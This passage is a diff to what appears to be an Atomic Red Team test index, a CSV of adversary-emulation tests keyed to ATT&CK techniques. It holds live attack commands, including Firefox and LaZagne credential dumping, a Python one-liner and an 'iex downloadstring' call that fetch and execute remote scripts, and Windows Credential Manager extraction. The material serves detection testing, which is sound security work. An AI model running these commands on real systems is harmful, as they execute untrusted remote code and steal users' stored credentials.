-cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
+Invoke-WebRequest ""https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"" -outfile ""#{Firepwd_Path}""
 
 dependencies.5.description: Pycryptodome library must be installed 
 
-dependencies.5.prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
-if (pip show pycryptodome) {exit 0} else {exit 1}
+dependencies.5.prereq_command: if (#{venv_path}\Scripts\pip.exe show pycryptodome) {exit 0} else {exit 1}
 
-dependencies.5.get_prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
-if (test-path ""#{VS_CMD_Path}""){pip install pycryptodome | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq""}
+dependencies.5.get_prereq_command: if (test-path ""#{VS_CMD_Path}""){#{venv_path}\Scripts\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq""}
 
 dependencies.6.description: Pyasn1 library must be installed 
 
-dependencies.6.prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
-if (pip show pyasn1) {exit 0} else {exit 1}
+dependencies.6.prereq_command: if (#{venv_path}\Scripts\pip.exe show pyasn1) {exit 0} else {exit 1}
 
-dependencies.6.get_prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
-if (test-path ""#{VS_CMD_Path}""){pip install pyasn1 | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.""}
+dependencies.6.get_prereq_command: if (test-path ""#{VS_CMD_Path}"") & {#{venv_path}\Scripts\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.""}
 
 ","input_arguments.Firepwd_Path.description: Filepath for Firepwd.py
 
 input_arguments.Firepwd_Path.type: string
 
-input_arguments.Firepwd_Path.default: PathToAtomicsFolder\..\ExternalPayloads\Firepwd.py
+input_arguments.Firepwd_Path.default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py
 
 input_arguments.Out_Filepath.description: Filepath to output results to
 
@@ -18202,6 +18355,12 @@ input_arguments.Python_Path.description: Filepath to python
 input_arguments.Python_Path.type: string
 
 input_arguments.Python_Path.default: C:\Program Files\Python310\python.exe
+
+input_arguments.venv_path.description: Path to the folder for the tactics venv
+
+input_arguments.venv_path.type: string
+
+input_arguments.venv_path.default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004
 
 "
 T1555.003,Credentials from Password Stores: Credentials from Web Browsers,LaZagne.py - Dump Credentials from Firefox Browser,87e88698-621b-4c45-8a89-4eaebdeaabb1,"Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",linux,,,python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file},sh,True,,rm -R /tmp/LaZagne; rm -f #{output_file},sh,"dependencies.0.description: Get Lazagne from Github and install requirements
@@ -20183,9 +20342,9 @@ Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/m
 dependencies.0.prereq_command: if (Test-Path #{curl_path}) {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
-Invoke-WebRequest ""https://curl.haxx.se/windows/dl-7.71.1/curl-7.71.1-win32-mingw.zip"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""
+Invoke-WebRequest ""https://curl.se/windows/dl-8.6.0_2/curl-8.6.0_2-win32-mingw.zip"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""
 Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\curl""
-Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.71.1-win32-mingw\bin\curl.exe"" #{curl_path}
+Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl\curl-8.6.0_2-win32-mingw\bin\curl.exe"" #{curl_path}
 Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl""
 Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""
 
@@ -24089,6 +24248,7 @@ input_arguments.original_extension_handler.default: htafile
 T1059.006,Command and Scripting Interpreter: Python,Execute shell script via python's command mode arguement,3a95cdb2-c6ea-4761-b24e-02b71889b8bb,Download and execute shell script and write to file then execute locally using Python -c (command mode),linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
 $which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'
 ",sh,,,"rm #{payload_file_name} 
+pip-autoremove pypykatz >nul 2> nul
 ",sh,"dependencies.0.description: Verify if python is in the environment variable path and attempt to import requests library.
 dependencies.0.prereq_command: which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
 $which_python -c 'import requests' 2>/dev/null; echo $?
@@ -24287,6 +24447,7 @@ $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
 T1120,Peripheral Device Discovery,WinPwn - printercheck,cb6e76ca-861e-4a7f-be08-564caa3e6f75,Search for printers / potential vulns using printercheck function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 printercheck -noninteractive -consoleoutput",powershell,,,,,,
+T1120,Peripheral Device Discovery,Peripheral Device Discovery via fsutil,424e18fd-48b8-4201-8d3a-bf591523a686,Performs pheripheral device discovery utilizing fsutil to list all drives.,windows,,,fsutil fsinfo drives,command_prompt,,,,,,
 T1555,Credentials from Password Stores,Extract Windows Credential Manager via VBA,234f9b7c-b53d-4f32-897b-b880a6c9ea7b,"This module will extract the credentials found within the Windows credential manager and dump
 them to $env:TEMP\windows-credentials.txt
 ",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
